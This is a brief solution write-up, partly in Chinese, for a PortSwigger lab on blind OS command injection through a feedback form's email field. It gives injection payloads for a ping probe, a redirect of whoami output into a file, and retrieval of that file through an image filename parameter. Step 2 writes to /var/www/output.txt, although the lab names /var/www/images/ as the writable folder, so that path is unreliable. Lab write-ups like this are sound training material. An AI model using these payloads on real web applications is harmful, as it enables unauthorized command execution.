# Blind OS command injection with output redirection

## Information
---

- [PortSwigger - Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output. 

## Solution
---

1. 透過以下 payload 對每個參數檢查是否存在 command injection 漏洞。
    ```
    ;ping+-c+10+127.0.0.1;
    ```

2. 發現 email 參數存在 command injection 漏洞。則根據題意將 `whoami` 結果重定向至 **/var/www/output.txt**。
    ```
    ;whoami>/var/www/output.txt;
    ```

3. 最後透過開啟圖片的 **filename** 參數更改為 **output.txt**。
    ```
    ?filename=output.txt
    ```